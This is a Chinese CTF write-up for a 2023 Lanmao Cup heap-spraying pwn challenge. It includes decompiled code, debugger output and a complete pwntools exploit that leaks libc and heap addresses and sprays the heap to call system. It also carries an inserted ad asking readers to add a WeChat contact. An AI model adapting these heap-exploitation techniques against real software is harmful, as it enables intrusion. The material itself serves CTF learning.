## 关于堆喷

堆喷射（Heap
Spraying）是一种计算机安全攻击技术，它旨在在进程的堆中创建多个包含恶意负载的内存块。这种技术允许攻击者避免需要知道负载确切的内存地址，因为通过广泛地“喷射”堆，攻击者可以提高恶意负载被成功执行的机会。

这种技术尤其用于绕过地址空间布局随机化（ASLR）和其他内存保护机制。对于利用浏览器和其他客户端应用程序的漏洞特别有效。

## 前言

此题为2023年蓝帽杯初赛0解pwn题，比赛的时候是下午放出的，很难在赛点完成该题，算是比较高难度的题，他的题目核心思想确实和题目名字一样，堆喷，大量的随机化和滑板指令思想，在赛后一天后完成了攻破。此题，不是因为0解我才觉得他有意义，是因为他的堆喷思想和实际在工作中的二进制利用是很贴合的，确实第一次打这种题。

## 题目分析

checksec

    
    
    ❯ checksec main  
    [*] '/root/P-W-N/bulue/main'  
    Arch:     i386-32-little  
    RELRO:    Full RELRO  
    Stack:    Canary found  
    NX:       NX enabled  
    PIE:      PIE enabled

保护全开，很常规。

这个题其实要是能迅速静态分析完，其实也能很快出，也算是给我上了一课，要是我的好大儿GXH在，估计是可以在比赛中成为唯一解的。

先来看整个程序是去了符号表，我们先在start那定位main函数，__libc_start_main第一个参数就是main函数地址

    
    
    // positive sp value has been detected, the output may be wrong!  
    void __usercall __noreturn start(int a1@<eax>, void (*a2)(void)@<edx>)  
    {  
    int v2; // esi  
    int v3; // [esp-4h] [ebp-4h] BYREF  
    char *retaddr; // [esp+0h] [ebp+0h] BYREF  
    ​  
    v2 = v3;  
    v3 = a1;  
    __libc_start_main(  
    (int (__cdecl *)(int, char **, char **))sub_1D64,  
    v2,  
    &retaddr,  
    (void (*)(void))sub_1D90,  
    (void (*)(void))sub_1E00,  
    a2,  
    &v3);  
    __halt();  
    }

这个main没什么好看的，快进到初始化和菜单

初始化如下

    
    
    unsigned int sub_134D()  
    {  
    unsigned int result; // eax  
    unsigned int buf; // [esp+0h] [ebp-18h] BYREF  
    int fd; // [esp+4h] [ebp-14h]  
    int v3; // [esp+8h] [ebp-10h]  
    unsigned int v4; // [esp+Ch] [ebp-Ch]  
    ​  
    v4 = __readgsdword(0x14u);  
    setbuf(stdin, 0);  
    setbuf(stdout, 0);  
    setbuf(stderr, 0);  
    fd = open("/dev/urandom", 0);  
    if ( fd < 0 || read(fd, &buf, 4u) < 0 )  
    exit(0);  
    close(fd);  
    srand(buf);  
    v3 = rand();  
    malloc(4 * (v3 % 1638));  
    result = __readgsdword(0x14u) ^ v4;  
    if ( result )  
    sub_1E10();  
    return result;  
    }

初始化影响不是很大，就是建了个随机大小的chunk，但是因为后续是不释放这个chunk其实没什么影响。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

来看菜单，4是不存在的虚空功能

    
    
    int sub_15E4()  
    {  
    puts("========Welcome to new heap game========");  
    puts("1. Create Heap.");  
    puts("2. Show Heap.");  
    puts("3. Delete Heap.");  
    puts("4. Change Heap.");  
    puts("5. Action.");  
    puts("6. Exit.");  
    return printf("Please give me your choose : ");  
    }

我们直接来先看看后门函数5

    
    
    int sub_1C14()  
    {  
    int result; // eax  
    unsigned int v1; // [esp+Ch] [ebp-1Ch]  
    int v2; // [esp+10h] [ebp-18h]  
    ​  
    printf("Please input heap index : ");  
    v1 = sub_1461();  
    if ( v1 > 0xFFF || !dword_4060[2 * v1] )  
    return puts("Error happened.");  
    v2 = dword_4060[2 * v1 + 1] + dword_4060[2 * v1];  
    if ( !**(_DWORD **)v2 )  
    ​  
    return (*(int (__cdecl **)(const char *))(*(_DWORD *)v2 + 4))("cat flag");  
    result = *(_DWORD *)v2;  
    --**(_DWORD **)v2;  
    return result;  
    }

关于地址0x4060这个地方前面存的是堆的地址，后面是堆的大小，堆数量上限在0xFFF。

来看看v2 = dword_4060[2 * v1 + 1] + dword_4060[2 * v1];

这个就是取堆地址然堆地址加堆大小（可控输入任意值）然后赋值到v2，比如

    
    
    0x565a1060:     0x57aebf90      0x00000100

得到的就是0x57aec090

然后对0x57aec090里面存放的地址进行一个内存检测操作，如果前4位为0就执行后门，取0x57aec090内的地址的内存的后四位进行指针函数调用。此时链表如下

    
    
    0x57aec090 —▸ 0x57aeb300 ◂— 0x0

0x57aeb300内存如下（0xf7d99781为system地址）

    
    
    pwndbg> x/32wx 0x57aeb300  
    0x57aeb300:     0x00000000      0xf7d99781      0x00000000      0xf7d99781

分析完后门了，我们去看看add功能。可以看见是非常的长的，然后重点在于Switch选择和sub_14BA函数

    
    
    _DWORD *sub_1690()  
    {  
    _DWORD *result; // eax  
    int i; // [esp+4h] [ebp-34h]  
    int k; // [esp+8h] [ebp-30h]  
    int j; // [esp+Ch] [ebp-2Ch]  
    int m; // [esp+10h] [ebp-28h]  
    int v5; // [esp+14h] [ebp-24h]  
    int v6; // [esp+18h] [ebp-20h]  
    int v7; // [esp+1Ch] [ebp-1Ch]  
    ​  
    for ( i = 0; i <= 254 && dword_4060[i * dword_400C * dword_4008]; ++i )  
    ;  
    if ( (int *)i == off_4010 )  
    return (_DWORD *)puts("Ooops! Here is no space for you.");  
    printf("How much space do you need : ");  
    v5 = sub_1461();  
    if ( v5 <= 0 || v5 > 0x20000 )  
    return (_DWORD *)printf("Ooops! I can't allocate these spaces to you.");  
    for ( j = 0; j <= 15; ++j )  
    {  
    for ( k = rand() % 16; dword_4060[dword_4008 * (k + i * dword_400C)]; k = (k + 1) % 16 )  
    ;  
    dword_4060[dword_4008 * (k + i * dword_400C)] = malloc(v5 + 4);  
    dword_4060[(k + i * dword_400C) * dword_4008 + 1] = v5;  
    if ( !dword_4060[dword_4008 * (k + i * dword_400C)] )  
    {  
    puts("Ooops! Some error happened.");  
    exit(-1);  
    }  
    }  
    for ( m = 0; m <= 15; ++m )  
    {  
    puts("Please input your head data.");  
    sub_14BA((char *)dword_4060[dword_4008 * (m + i * dword_400C)], dword_4060[(m + i * dword_400C) * dword_4008 + 1]);  
    puts("Which flag do you want?");  
    v6 = sub_1461();  
    v7 = dword_4060[(m + i * dword_400C) * dword_4008 + 1] + dword_4060[dword_4008 * (m + i * dword_400C)];  
    switch ( v6 )  
    {  
    case 1:  
    *(_BYTE *)v7 = (unsigned __int8)sub_1528 + 0xFFFFC064 + (unsigned __int8)&off_3F9C - 4;  
    *(_WORD *)(v7 + 1) = (unsigned int)sub_1528 >> 8;  
    *(_BYTE *)(v7 + 3) = (unsigned int)sub_1528 >> 24;  
    break;  
    case 2:  
    *(_BYTE *)v7 = (unsigned __int8)sub_1557 - 16284 + (unsigned __int8)&off_3F9C - 4;  
    *(_WORD *)(v7 + 1) = (unsigned int)sub_1557 >> 8;  
    *(_BYTE *)(v7 + 3) = (unsigned int)sub_1557 >> 24;  
    break;  
    case 3:  
    *(_BYTE *)v7 = (unsigned __int8)sub_1586 - 16284 + (unsigned __int8)&off_3F9C - 4;  
    *(_WORD *)(v7 + 1) = (unsigned int)sub_1586 >> 8;  
    *(_BYTE *)(v7 + 3) = (unsigned int)sub_1586 >> 24;  
    break;  
    case 4:  
    *(_BYTE *)v7 = (unsigned __int8)sub_15B5 - 16284 + (unsigned __int8)&off_3F9C - 4;  
    *(_WORD *)(v7 + 1) = (unsigned int)sub_15B5 >> 8;  
    *(_BYTE *)(v7 + 3) = (unsigned int)sub_15B5 >> 24;  
    break;  
    }  
    }  
    printf("Heap create from : %d to %d\n", 16 * i, 16 * (i + 1) - 1);  
    result = dword_4040;  
    dword_4040[0] = i;  
    return result;  
    }

我们先看看sub_14BA函数，可以看见逻辑是无限读入，存在堆溢出，后续堆喷滑动要用上。在输入的最后末尾都会变成0截断符，相当于带有一个off by
null，但是这里也用不上的，核心在于堆块bin构造，要非常熟悉bin的回收机制，还有利用好下面的Switch选择来把0截断给绕过。

    
    
    int __cdecl sub_14BA(char *buf, int a2)  
    {  
    while ( a2 )  
    {  
    if ( read(0, buf, 1u) != 1 )  
    exit(-1);  
    if ( *buf == 10 )  
    {  
    *buf = 0;  
    break;  
    }  
    ++buf;  
    }  
    *buf = 0;  
    return 0;  
    }

我们来继续看这个Switch选择，其实4个选项都是差不多的只是返回值的地址不一样而已，调一个就好了。

他会对所有的在0x4060上的chunk都进行赋值操作，我们先重点关注下v7的取值

    
    
    dword_4060[(m + i * dword_400C) * dword_4008 + 1] + dword_4060[dword_4008 * (m + i * dword_400C)];

可以看见v7的取值一样是堆的起始地址加上我们的大小，注意注意，这个大小是我们自己输入的，也就是可以打1,2,3.....

如果是这样的话比如我们的起始地址是0x100，大小是输入了1，内容输入的是a，那么经过下面的case 1操作

    
    
    case 1:  
    *(_BYTE *)v7 = (unsigned __int8)sub_1528 + 0xFFFFC064 + (unsigned __int8)&off_3F9C - 4;  
    *(_WORD *)(v7 + 1) = (unsigned int)sub_1528 >> 8;  
    *(_BYTE *)(v7 + 3) = (unsigned int)sub_1528 >> 24;

就会得到内容如下(此处字节码只做替代作用，非真实情况)

    
    
    0x100:a  
    0x101:\x01  
    0x102:\x02  
    0x103:\x03  
    0x104:\x04 (本应是libc or heap 但是由于v7取的是起始地址加大小刚好覆盖了一位地址，但是无所谓，低三位随便盖)  
    0x105:libc or heap  
    0x106:libc or heap  
    0x107:libc or heap

要是不去调用这4个case中的任一一个，就会变成如下，最后就会因为之前的溢出读入函数导致末尾强行加上了截断符

    
    
    0x100:a  
    0x101:\x00  
    0x102:libc or heap  
    ..................

也就是说，只要把握好一个堆块的BK指针存储上堆地址或者libc地址就能通过申请的时候申请大小为1的堆块（实际为0x10）来绕过0截断，进而泄露地址。

对于这个chunk 构造，我是直接选择了非常暴力的操作，因为他一次性add操作会直接申请16个chunk，free的时候是全free。

所以泄露操作的exp如下，直接破坏他们的链表

    
    
    create_heap(0xa0, b'1','data',4)  
    create_heap(1, b'1','data',4)  
    create_heap(0x60, b'1','data',4)  
    create_heap(1, b'1','data',4)  
    ​  
    delete_heap()  
    delete_heap()  
    delete_heap()  
    delete_heap()  
    ​  
    create_heap(1, b'1','data',4)  
    create_heap(1, b'1','data',4)  
    create_heap(1, b'1','data',4)

bin如下

    
    
    pwndbg> bin  
    tcachebins  
    0x10 [  7]: 0x579aeaf0 —▸ 0x579aeae0 —▸ 0x579aeab0 —▸ 0x579aead0 —▸ 0x579aeaa0 —▸ 0x579aea70 —▸ 0x579aea60 ◂— 0x0  
    0x70 [  7]: 0x579ae5e0 —▸ 0x579ae880 —▸ 0x579ae810 —▸ 0x579ae7a0 —▸ 0x579ae730 —▸ 0x579ae570 —▸ 0x579ae500 ◂— 0x0  
    0xb0 [  7]: 0x579aded0 —▸ 0x579adb60 —▸ 0x579ada00 —▸ 0x579ad950 —▸ 0x579ad740 —▸ 0x579ad8a0 —▸ 0x579ae030 ◂— 0x0  
    fastbins  
    0x10: 0x579ae288 —▸ 0x579ae258 —▸ 0x579ae248 —▸ 0x579ae238 —▸ 0x579ae328 ◂— ...  
    unsortedbin  
    all [corrupted]  
    FD: 0x579ae0d8 —▸ 0x579adf78 —▸ 0x579adc08 —▸ 0x579adaa8 —▸ 0x579ad7e8 ◂— ...  
    BK: 0x579ae8e8 —▸ 0x579ae338 —▸ 0x579ae648 —▸ 0x579ad7e8 —▸ 0x579adaa8 ◂— ...  
    smallbins  
    empty  
    largebins  
    empty  
    pwndbg>

此时就会出现如下的神仙堆块，这就是我们要的最完美的堆块

    
    
    Free chunk (unsortedbin) | PREV_INUSE  
    Addr: 0x579ae8e8  
    Size: 0x151  
    fd: 0xf7f48778  
    bk: 0x579ae338

但是要明白一点，unsortedbin可不止这一个，而且他不是每次都一定处于链表的头部的，所以还要写一个全输出和筛选操作

    
    
    # Assuming leak_all is defined as an empty list before this  
    leak_all = []  
    heap_addr = None  
    libc_base = None  
    ​  
    for i in range(46):  
    leak = leak_libc(i)  
    if leak > 0x56000000:  
    leak_all.append(leak)  
    print(hex(leak))  
      
    # Assigning values to heap_addr and libc_base  
    if heap_addr is None and leak < 0xf7000000:  
    heap_addr = leak+0x1000-0x56  
    elif libc_base is None and leak > 0xf7000000:  
    libc_base = leak-0x1eb756

这样就可以稳定的获得libc，和一个堆地址。

然后经过内存调试发现，该堆地址在有一定概率在后续申请的堆块的下面，我们可以进行栈溢出覆盖该堆地址的内容，完成上面后门要求的条件。

所以，直接进行堆喷覆盖，index为0的chunk+0x100肯定在自己的下面，我们要考虑爆破的只有堆风水和上面泄露的heap_addr是不是也在index为0的chunk后面就行了，对于这个问题就交给运气吧，爆就完事了。

tips:(上面的堆风水是因为，他的add的时候用了random瞎赋值下标干扰程序增强随机化导致的，有时候链表不是我想的那么完美有可能踩值会踩不到
0x580e97a0 —▸ 0x580e8900 ◂— 0 ，会变成0x580e97a0 —▸ 0x580e8900 ◂— 0x580e8900
这就是因为堆风水导致padding不稳定，)

    
    
    # Checking the assigned values  
    print("heap_addr:", hex(heap_addr))  
    print("libc_base:", hex(libc_base))  
    sys=libc_base+libc.sym['system']  
    pay=p32(0)+p32(sys)+p32(heap_addr)*0x330+(p32(0)+p32(sys))*0x1000  
    create_heap(0x100, pay,pay,0)  
    p.sendlineafter("Please give me your choose : ", "5")  
    p.sendlineafter("Please input heap index : ", "0")

## exp

    
    
    from pwn import *  
    ​  
    # 连接到题目提供的服务端  
    p = process('./main')  
    context.log_level='debug'  
    libc=ELF('/root/P-W-N/bulue/glibc-all-in-one/libs/2.31-0ubuntu9.9_i386/libc.so.6')  
    def create_heap(size, data,data2,flag):  
    p.sendlineafter("Please give me your choose : ", "1")  
    p.sendlineafter("How much space do you need : ", str(size))  
    p.sendlineafter("Please input your head data.", data)  
    p.sendlineafter("Which flag do you want?", str(flag))  
    for _ in range(15):  
    p.sendlineafter("Please input your head data.", data2)  
    p.sendlineafter("Which flag do you want?", str(flag))  
    ​  
    def delete_heap():  
    p.sendlineafter("Please give me your choose : ", "3")  
    ​  
    all_leak=[]  
    def leak_libc(idx):  
    p.sendlineafter("Please give me your choose : ", "2")  
    p.sendlineafter("Please input heap index : ", str(idx))  
    p.recvuntil("Heap information is ")  
    p.recv(4)  
    leak = u32(p.recv(4).ljust(4,b'\x00'))  
    return leak  
    gdb.attach(p,'b *$rebase(0x01C9E)')  
    ​  
    #构建理想chunk，bk带有堆指针或libc指针，这种chunk可以批发的  
    create_heap(0xa0, b'1','data',4)  
    create_heap(1, b'1','data',4)  
    create_heap(0x60, b'1','data',4)  
    create_heap(1, b'1','data',4)  
    ​  
    delete_heap()  
    delete_heap()  
    delete_heap()  
    delete_heap()  
    ​  
    #申请小chunk 疯狂切割，直接一点点带出来  
    create_heap(1, b'1','data',4)  
    create_heap(1, b'1','data',4)  
    create_heap(1, b'1','data',4)  
    ​  
    # Assuming leak_all is defined as an empty list before this  
    leak_all = []  
    heap_addr = None  
    libc_base = None  
    ​  
    for i in range(46):  
    leak = leak_libc(i)  
    if leak > 0x56000000:  
    leak_all.append(leak)  
    print(hex(leak))  
      
    # Assigning values to heap_addr and libc_base  
    if heap_addr is None and leak < 0xf7000000:  
    heap_addr = leak+0x1000-0x56  
    elif libc_base is None and leak > 0xf7000000:  
    libc_base = leak-0x1eb756  
    delete_heap()  
    delete_heap()  
    delete_heap()  
    # Checking the assigned values  
    print("heap_addr:", hex(heap_addr))  
    print("libc_base:", hex(libc_base))  
    sys=libc_base+libc.sym['system']  
    #堆风水随缘padding，最后的p32(0)+p32(sys)是因为要满足后门格式，由于我们不可能得到具体的距离，只能用滑板思想批量填充滑动  
    pay=p32(0)+p32(sys)+p32(heap_addr)*0x330+(p32(0)+p32(sys))*0x1000  
    create_heap(0x100, pay,pay,0)  
    p.sendlineafter("Please give me your choose : ", "5")  
    p.sendlineafter("Please input heap index : ", "0")  
    ​  
    p.interactive()  
    ​

![1.png](https://image.3001.net/images/20230830/1693383889_64eefcd12e145b6348b97.png!small)

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

